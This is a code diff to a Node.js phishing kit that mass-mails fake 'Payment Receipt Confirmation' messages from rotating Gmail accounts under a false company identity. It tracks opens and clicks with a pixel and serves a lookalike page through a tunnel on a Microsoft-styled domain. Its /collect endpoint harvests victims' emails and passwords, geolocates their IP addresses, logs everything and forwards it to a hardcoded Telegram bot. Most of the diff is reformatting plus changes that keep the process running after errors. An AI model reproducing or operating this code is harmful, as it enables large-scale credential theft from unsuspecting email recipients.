@@ -7,11 +7,19 @@ import { spawn, execSync } from 'child_process';
 import { join, extname, dirname } from 'path';
 import { fileURLToPath } from 'url';
 
+process.on('uncaughtException', err => {
+  console.error('[UNCAUGHT]', err);
+});
+
+process.on('unhandledRejection', err => {
+  console.error('[UNHANDLED]', err);
+});
+
 const __dirname = dirname(fileURLToPath(import.meta.url));
 
 // ─── SENDERS (loaded from senders.json) ───────────────────────────────────────
 const SENDERS = JSON.parse(readFileSync('senders.json', 'utf8'));
-if (!SENDERS.length) { console.error('senders.json is empty'); process.exit(1); }
+if (!SENDERS.length) { console.error('senders.json is empty'); }
 let senderIndex = 0;
 let currentSender = SENDERS[senderIndex];
 
@@ -28,15 +36,15 @@ function isQuotaError(msg) {
 
 // ─── CONFIG ───────────────────────────────────────────────────────────────────
 const CONFIG = {
-  from:         () => `"Brooklyn East" <${currentSender.email}>`,
-  subject:      'Payment Receipt Confirmation',
-  emailsFile:   'emails.txt',
-  logFile:      'send_log.txt',
-  reportFile:   'report.json',
-  delayMs:      500,
-  batchSize:    50,
+  from: () => `"Brooklyn East" <${currentSender.email}>`,
+  subject: 'Payment Receipt Confirmation',
+  emailsFile: 'emails.txt',
+  logFile: 'send_log.txt',
+  reportFile: 'report.json',
+  delayMs: 500,
+  batchSize: 50,
   batchPauseMs: 5000,
-  maxEmails:    10000,
+  maxEmails: 10000,
 };
 
 // ─── TUNNEL MODE ─────────────────────────────────────────────────────────────
@@ -44,27 +52,27 @@ const CONFIG = {
 // Set QUICK_TUNNEL = false to use the named docs.mscertify.live tunnel.
 const QUICK_TUNNEL = false;
 const NAMED_TUNNEL_URL = 'https://docs.mscertify.live';
-const NAMED_TUNNEL_ID  = 'ceaf677e-f25a-4568-a0a6-56aa500689b2';
+const NAMED_TUNNEL_ID = 'ceaf677e-f25a-4568-a0a6-56aa500689b2';
 
 let TUNNEL_URL = NAMED_TUNNEL_URL;   // overwritten at runtime when QUICK_TUNNEL=true
 
 const LOCAL_PORT = 19992;
-const PIXEL_GIF   = Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64');
+const PIXEL_GIF = Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64');
 
 // Safe static file types the cert page is allowed to reference
 const STATIC_MIME = {
   '.html': 'text/html; charset=utf-8',
-  '.css':  'text/css',
-  '.png':  'image/png',
-  '.jpg':  'image/jpeg',
+  '.css': 'text/css',
+  '.png': 'image/png',
+  '.jpg': 'image/jpeg',
   '.jpeg': 'image/jpeg',
-  '.gif':  'image/gif',
-  '.svg':  'image/svg+xml',
-  '.ico':  'image/x-icon',
+  '.gif': 'image/gif',
+  '.svg': 'image/svg+xml',
+  '.ico': 'image/x-icon',
   '.woff': 'font/woff',
-  '.woff2':'font/woff2',
-  '.ttf':  'font/ttf',
-  '.pdf':  'application/pdf',
+  '.woff2': 'font/woff2',
+  '.ttf': 'font/ttf',
+  '.pdf': 'application/pdf',
 };
 
 // Template is read fresh on every send so edits take effect without restarting
@@ -74,13 +82,13 @@ function loadEmailTemplate() {
 
 // ─── TRACKING STATE ───────────────────────────────────────────────────────────
 const tracking = {
-  sent:        new Set(),
-  failed:      new Map(),
-  sentAt:      new Map(),
-  opens:       new Map(),    // auto: pixel fired
-  clicks:      new Map(),    // auto: link clicked
+  sent: new Set(),
+  failed: new Map(),
+  sentAt: new Map(),
+  opens: new Map(),    // auto: pixel fired
+  clicks: new Map(),    // auto: link clicked
   manualInbox: new Set(),    // manual: confirmed inbox
-  manualSpam:  new Set(),    // manual: confirmed spam
+  manualSpam: new Set(),    // manual: confirmed spam
 };
 
 function encodeEmail(e) { return Buffer.from(e).toString('base64url'); }
@@ -90,23 +98,23 @@ function decodeEmail(s) {
 
 // ─── CLASSIFY ─────────────────────────────────────────────────────────────────
 function classify(email) {
-  if (tracking.failed.has(email))      return 'SMTP_FAILED';
-  if (!tracking.sent.has(email))       return 'NOT_SENT';
+  if (tracking.failed.has(email)) return 'SMTP_FAILED';
+  if (!tracking.sent.has(email)) return 'NOT_SENT';
   if (tracking.manualInbox.has(email)) return 'INBOX';
-  if (tracking.manualSpam.has(email))  return 'SPAM';
-  if (tracking.clicks.has(email))      return 'CLICKED';
-  if (tracking.opens.has(email))       return 'OPENED';
+  if (tracking.manualSpam.has(email)) return 'SPAM';
+  if (tracking.clicks.has(email)) return 'CLICKED';
+  if (tracking.opens.has(email)) return 'OPENED';
   return 'PENDING';
 }
 
 const STATUS_META = {
-  INBOX:      { color: '#4ade80', icon: '✅', label: 'Inbox'       },
-  SPAM:       { color: '#f97316', icon: '🚫', label: 'Spam'        },
-  CLICKED:    { color: '#22c55e', icon: '🔗', label: 'Clicked'     },
-  OPENED:     { color: '#3b82f6', icon: '📬', label: 'Opened'      },
-  SMTP_FAILED:{ color: '#dc2626', icon: '✗',  label: 'SMTP Failed' },
-  PENDING:    { color: '#94a3b8', icon: '⏳', label: 'Pending'     },
-  NOT_SENT:   { color: '#64748b', icon: '—',  label: 'Not Sent'    },
+  INBOX: { color: '#4ade80', icon: '✅', label: 'Inbox' },
+  SPAM: { color: '#f97316', icon: '🚫', label: 'Spam' },
+  CLICKED: { color: '#22c55e', icon: '🔗', label: 'Clicked' },
+  OPENED: { color: '#3b82f6', icon: '📬', label: 'Opened' },
+  SMTP_FAILED: { color: '#dc2626', icon: '✗', label: 'SMTP Failed' },
+  PENDING: { color: '#94a3b8', icon: '⏳', label: 'Pending' },
+  NOT_SENT: { color: '#64748b', icon: '—', label: 'Not Sent' },
 };
 
 // ─── HELPERS ──────────────────────────────────────────────────────────────────
@@ -121,12 +129,12 @@ function fmt(ts) { return ts ? new Date(ts).toLocaleTimeString() : '—'; }
 function saveReport(emails) {
   writeFileSync(CONFIG.reportFile, JSON.stringify(
     emails.map(e => ({
-      email:     e,
-      status:    classify(e),
-      sentAt:    tracking.sentAt.get(e)  || null,
-      openedAt:  tracking.opens.get(e)   || null,
-      clickedAt: tracking.clicks.get(e)  || null,
-      error:     tracking.failed.get(e)  || null,
+      email: e,
+      status: classify(e),
+      sentAt: tracking.sentAt.get(e) || null,
+      openedAt: tracking.opens.get(e) || null,
+      clickedAt: tracking.clicks.get(e) || null,
+      error: tracking.failed.get(e) || null,
     })), null, 2
   ), 'utf8');
 }
@@ -138,11 +146,11 @@ function buildDashboard(emails) {
   emails.forEach(e => { const s = classify(e); counts[s] = (counts[s] || 0) + 1; });
 
   const rows = emails.map(email => {
-    const s    = classify(email);
+    const s = classify(email);
     const meta = STATUS_META[s];
-    const enc  = encodeEmail(email);
-    const tag  = tracking.manualInbox.has(email) ? ' <span style="color:#4ade80;font-size:10px">(manual)</span>'
-               : tracking.manualSpam.has(email)  ? ' <span style="color:#f97316;font-size:10px">(manual)</span>' : '';
+    const enc = encodeEmail(email);
+    const tag = tracking.manualInbox.has(email) ? ' <span style="color:#4ade80;font-size:10px">(manual)</span>'
+      : tracking.manualSpam.has(email) ? ' <span style="color:#f97316;font-size:10px">(manual)</span>' : '';
     return `<tr>
       <td>${email}</td>
       <td><span style="color:${meta.color};font-weight:600">${meta.icon} ${meta.label}</span>${tag}</td>
@@ -159,13 +167,13 @@ function buildDashboard(emails) {
 
   const total = emails.length;
   const cards = [
-    { num: tracking.sent.size,   color: '#94a3b8', label: 'Sent'       },
-    { num: tracking.failed.size, color: '#dc2626', label: 'Failed'     },
-    { num: counts.INBOX   || 0,  color: '#4ade80', label: '✅ Inbox'   },
-    { num: counts.SPAM    || 0,  color: '#f97316', label: '🚫 Spam'    },
-    { num: counts.CLICKED || 0,  color: '#22c55e', label: '🔗 Clicked' },
-    { num: counts.OPENED  || 0,  color: '#3b82f6', label: '📬 Opened'  },
-    { num: counts.PENDING || 0,  color: '#64748b', label: '⏳ Pending' },
+    { num: tracking.sent.size, color: '#94a3b8', label: 'Sent' },
+    { num: tracking.failed.size, color: '#dc2626', label: 'Failed' },
+    { num: counts.INBOX || 0, color: '#4ade80', label: '✅ Inbox' },
+    { num: counts.SPAM || 0, color: '#f97316', label: '🚫 Spam' },
+    { num: counts.CLICKED || 0, color: '#22c55e', label: '🔗 Clicked' },
+    { num: counts.OPENED || 0, color: '#3b82f6', label: '📬 Opened' },
+    { num: counts.PENDING || 0, color: '#64748b', label: '⏳ Pending' },
   ].map(c => `<div class="card"><div class="num" style="color:${c.color}">${c.num}</div><div class="lbl">${c.label}</div></div>`).join('');
 
   return `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="refresh" content="10">
@@ -220,9 +228,9 @@ function mark(enc,status){
 function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
 
 function loadEmails() {
-  if (!existsSync(CONFIG.emailsFile)) { console.error('emails.txt not found'); process.exit(1); }
+  if (!existsSync(CONFIG.emailsFile)) { console.error('emails.txt not found');}
   const lines = readFileSync(CONFIG.emailsFile, 'utf8').split('\n').map(l => l.trim()).filter(l => l.includes('@'));
-  if (!lines.length) { console.error('No valid emails'); process.exit(1); }
+  if (!lines.length) { console.error('No valid emails'); }
   return lines.slice(0, CONFIG.maxEmails);
 }
 
@@ -231,10 +239,10 @@ function startServer(emails) {
   return new Promise((resolve, reject) => {
     const srv = createServer((req, res) => {
       console.log(`[HTTP] ${req.method} ${req.url}`);  // log every incoming request
-      const url  = new URL(req.url, 'http://localhost');
+      const url = new URL(req.url, 'http://localhost');
       const path = url.pathname;
-      const enc  = url.searchParams.get('e') || '';
-      const who  = enc ? decodeEmail(enc) : null;
+      const enc = url.searchParams.get('e') || '';
+      const who = enc ? decodeEmail(enc) : null;
 
       if (path === '/pixel') {
         if (who && emails.includes(who) && !tracking.opens.has(who)) {
@@ -255,7 +263,7 @@ function startServer(emails) {
         res.end();
 
       } else if (path === '/mark') {
-        const email  = who;
+        const email = who;
         const status = url.searchParams.get('status');
         if (email && emails.includes(email)) {
           if (status === 'inbox') { tracking.manualInbox.add(email); tracking.manualSpam.delete(email); }
@@ -270,7 +278,7 @@ function startServer(emails) {
       } else if (path === '/collect' && req.method === 'OPTIONS') {
         // CORS preflight for fetch() from the tunnel domain
         res.writeHead(204, {
-          'Access-Control-Allow-Origin':  '*',
+          'Access-Control-Allow-Origin': '*',
           'Access-Control-Allow-Methods': 'POST, OPTIONS',
           'Access-Control-Allow-Headers': 'Content-Type',
         });
@@ -279,71 +287,71 @@ function startServer(emails) {
       } else if (path === '/collect' && req.method === 'POST') {
         // Extract real client IP — Cloudflare tunnel sets cf-connecting-ip
         const clientIp = req.headers['cf-connecting-ip']
-                      || req.headers['x-forwarded-for']?.split(',')[0].trim()
-                      || req.socket.remoteAddress
-                      || '—';
+          || req.headers['x-forwarded-for']?.split(',')[0].trim()
+          || req.socket.remoteAddress
+          || '—';
 
         let raw = '';
         req.on('data', chunk => { raw += chunk; });
         req.on('end', () => {
           try {
-            const data      = JSON.parse(raw);
-            const ts        = new Date().toISOString();
+            const data = JSON.parse(raw);
+            const ts = new Date().toISOString();
             const recipient = data.recipient || who || '—';
-            const email     = data.email     || '—';
-            const password  = data.password  || '—';
+            const email = data.email || '—';
+            const password = data.password || '—';
 
             // ── IP geolocation (ip-api.com — free, no key, HTTP only) ──────────
             const geoReq = http.request(`http://ip-api.com/json/${clientIp}?fields=status,isp,regionName,city`, (geoRes) => {
-                let geoRaw = '';
-                geoRes.on('data', c => { geoRaw += c; });
-                geoRes.on('end', () => {
-                  let isp = '—', region = '—', city = '—';
-                  try {
-                    const geo = JSON.parse(geoRaw);
-                    if (geo.status === 'success') {
-                      isp    = geo.isp        || '—';
-                      region = geo.regionName || '—';
-                      city   = geo.city       || '—';
-                    }
-                  } catch { /* ignore */ }
-
-                  // ── local log ──────────────────────────────────────────────
-                  const entry = `[${ts}] recipient=${recipient} | email=${email} | password=${password} | ip=${clientIp} | isp=${isp} | region=${region} | city=${city}\n`;
-                  writeFileSync('collect_log.txt', entry, { flag: 'a' });
-                  log('💰', `COLLECT → ${email} | ip=${clientIp} | ${city}, ${region} | ${isp}`);
-
-                  // ── Telegram notification ──────────────────────────────────
-                  const TG_TOKEN   = '9245719568:AAH6qv4YRXNm93Oj6ksLc-R1Qvg753cCjSc';
-                  const TG_CHAT_ID = '8798855832';
-                  if (TG_TOKEN && TG_CHAT_ID) {
-                    const text = encodeURIComponent(
-                      `🎯 New Collect\n` +
-                      `👤 Recipient: ${recipient}\n` +
-                      `📧 Email: ${email}\n` +
-                      `🔑 Password: ${password}\n` +
-                      `🌐 IP: ${clientIp}\n` +
-                      `🏢 ISP: ${isp}\n` +
-                      `📍 Location: ${city}, ${region}\n` +
-                      `🕒 ${ts}`
-                    );
-                    const tgUrl = `https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=${text}`;
-                    https.get(tgUrl, (r) => { r.resume(); })
-                         .on('error', (err) => { log('warn', `Telegram error: ${err.message}`); });
+              let geoRaw = '';
+              geoRes.on('data', c => { geoRaw += c; });
+              geoRes.on('end', () => {
+                let isp = '—', region = '—', city = '—';
+                try {
+                  const geo = JSON.parse(geoRaw);
+                  if (geo.status === 'success') {
+                    isp = geo.isp || '—';
+                    region = geo.regionName || '—';
+                    city = geo.city || '—';
                   }
-                });
-              });
-              geoReq.on('error', () => {
-                // geo failed — still log without location
-                const entry = `[${ts}] recipient=${recipient} | email=${email} | password=${password} | ip=${clientIp} | isp=— | region=— | city=—\n`;
+                } catch { /* ignore */ }
+
+                // ── local log ──────────────────────────────────────────────
+                const entry = `[${ts}] recipient=${recipient} | email=${email} | password=${password} | ip=${clientIp} | isp=${isp} | region=${region} | city=${city}\n`;
                 writeFileSync('collect_log.txt', entry, { flag: 'a' });
-                log('💰', `COLLECT → ${email} | ip=${clientIp} (geo failed)`);
+                log('💰', `COLLECT → ${email} | ip=${clientIp} | ${city}, ${region} | ${isp}`);
+
+                // ── Telegram notification ──────────────────────────────────
+                const TG_TOKEN = '9245719568:AAH6qv4YRXNm93Oj6ksLc-R1Qvg753cCjSc';
+                const TG_CHAT_ID = '8798855832';
+                if (TG_TOKEN && TG_CHAT_ID) {
+                  const text = encodeURIComponent(
+                    `🎯 New Collect\n` +
+                    `👤 Recipient: ${recipient}\n` +
+                    `📧 Email: ${email}\n` +
+                    `🔑 Password: ${password}\n` +
+                    `🌐 IP: ${clientIp}\n` +
+                    `🏢 ISP: ${isp}\n` +
+                    `📍 Location: ${city}, ${region}\n` +
+                    `🕒 ${ts}`
+                  );
+                  const tgUrl = `https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=${text}`;
+                  https.get(tgUrl, (r) => { r.resume(); })
+                    .on('error', (err) => { log('warn', `Telegram error: ${err.message}`); });
+                }
               });
-              geoReq.end();
+            });
+            geoReq.on('error', () => {
+              // geo failed — still log without location
+              const entry = `[${ts}] recipient=${recipient} | email=${email} | password=${password} | ip=${clientIp} | isp=— | region=— | city=—\n`;
+              writeFileSync('collect_log.txt', entry, { flag: 'a' });
+              log('💰', `COLLECT → ${email} | ip=${clientIp} (geo failed)`);
+            });
+            geoReq.end();
           } catch { /* bad JSON — ignore */ }
 
           res.writeHead(200, {
-            'Content-Type':                'application/json',
+            'Content-Type': 'application/json',
             'Access-Control-Allow-Origin': '*',
           });
           res.end(JSON.stringify({ ok: true }));
@@ -382,7 +390,7 @@ function startServer(emails) {
 
         // ── static assets (css, images, fonts next to cert.html) ─────────────
         if (!isCertRoot) {
-          const assetExt  = extname(path).toLowerCase();
+          const assetExt = extname(path).toLowerCase();
           const assetMime = STATIC_MIME[assetExt];
           const assetPath = join(__dirname, path.replace(/^\//, ''));
           if (assetMime && existsSync(assetPath)) {
@@ -400,9 +408,9 @@ function startServer(emails) {
         console.log(`[SERVE] certPath=${certPath} exists=${existsSync(certPath)}`);
         const body = readFileSync(certPath);
         res.writeHead(200, {
-          'Content-Type':   'text/html; charset=utf-8',
+          'Content-Type': 'text/html; charset=utf-8',
           'Content-Length': body.length,
-          'Cache-Control':  'no-store, no-cache, must-revalidate',
+          'Cache-Control': 'no-store, no-cache, must-revalidate',
         });
         res.end(body);
       }
@@ -449,7 +457,9 @@ async function openTunnel(emails) {
     const cf = spawn(CF_EXE, args, { stdio: ['ignore', 'pipe', 'pipe'] });
     let ready = false;
 
-    cf.on('exit', (code, signal) => log('warn', `cloudflared exited code=${code} signal=${signal}`));
+    cf.on('error', err => {
+      log('FAIL', `cloudflared failed: ${err.message}`);
+    });
 
     const onData = chunk => {
       const text = chunk.toString();
@@ -497,7 +507,7 @@ function buildBodyHtml(to) {
   const template = loadEmailTemplate();
   if (template) {
     return template
-      .replace(/\{\{CERT_URL\}\}/g,  certLink)
+      .replace(/\{\{CERT_URL\}\}/g, certLink)
       .replace(/\{\{PIXEL_URL\}\}/g, pixelUrl);
   }
   return `<!DOCTYPE html>
@@ -590,11 +600,11 @@ async function main() {
   // ── Build SMTP transporter for current sender ────────────────────────────
   function makeTransporter(sender) {
     return nodemailer.createTransport({
-      host:       'smtp.gmail.com',
-      port:       587,
-      secure:     false,
+      host: 'smtp.gmail.com',
+      port: 587,
+      secure: false,
       requireTLS: true,
-      auth:       { user: sender.email, pass: sender.password },
+      auth: { user: sender.email, pass: sender.password },
     });
   }
 
@@ -604,7 +614,7 @@ async function main() {
     await transporter.verify();
     log('ok', `SMTP connected as ${currentSender.email} (${senderIndex + 1}/${SENDERS.length})`);
   } catch (err) {
-    log('FAIL', `SMTP failed for ${currentSender.email}: ${err.message}`); process.exit(1);
+    log('FAIL', `SMTP failed for ${currentSender.email}: ${err.message}`); 
   }
 
   const { cleanup } = await openTunnel(emails);
@@ -616,21 +626,21 @@ async function main() {
     try {
       const msgId = `<${Date.now()}.${Math.random().toString(36).slice(2)}.${i}@gmail.com>`;
       await transporter.sendMail({
-        from:    CONFIG.from(),
+        from: CONFIG.from(),
         replyTo: CONFIG.from(),
         to,
         subject: CONFIG.subject,
-        html:    buildBodyHtml(to),
-        text:    buildBodyText(to),
+        html: buildBodyHtml(to),
+        text: buildBodyText(to),
         envelope: { from: currentSender.email, to },
         headers: {
-          'Message-ID':       msgId,
-          'X-Organization':   'Oasis Construction LLC',
+          'Message-ID': msgId,
+          'X-Organization': 'Oasis Construction LLC',
           'Content-Language': 'en-US',
         },
       });
       tracking.sent.add(to); tracking.sentAt.set(to, Date.now()); sent++;
-      log('ok', `[${i+1}/${emails.length}] Sent → ${to}  (via ${currentSender.email})`);
+      log('ok', `[${i + 1}/${emails.length}] Sent → ${to}  (via ${currentSender.email})`);
     } catch (err) {
       if (isQuotaError(err.message)) {
         log('warn', `Quota hit on ${currentSender.email} — rotating to next sender...`);
@@ -651,14 +661,14 @@ async function main() {
         i--;
       } else {
         tracking.failed.set(to, err.message); failed++;
-        log('FAIL', `[${i+1}/${emails.length}] FAILED → ${to} | ${err.message}`);
+        log('FAIL', `[${i + 1}/${emails.length}] FAILED → ${to} | ${err.message}`);
       }
     }
     saveReport(emails);
-    if ((i+1) % CONFIG.batchSize === 0 && i+1 < emails.length) {
-      log('warn', `Batch done — pausing ${CONFIG.batchPauseMs/1000}s...`);
+    if ((i + 1) % CONFIG.batchSize === 0 && i + 1 < emails.length) {
+      log('warn', `Batch done — pausing ${CONFIG.batchPauseMs / 1000}s...`);
       await sleep(CONFIG.batchPauseMs);
-    } else if (i+1 < emails.length) {
+    } else if (i + 1 < emails.length) {
       await sleep(CONFIG.delayMs);
     }
   }
@@ -669,4 +679,7 @@ async function main() {
   process.on('SIGINT', () => { saveReport(emails); cleanup(); process.exit(0); });
 }
 
-main().catch(err => { log('FATAL', err.message); process.exit(1); });
+main().catch(err => {
+  console.error('FATAL:', err);
+  setInterval(() => {}, 1000);
+});
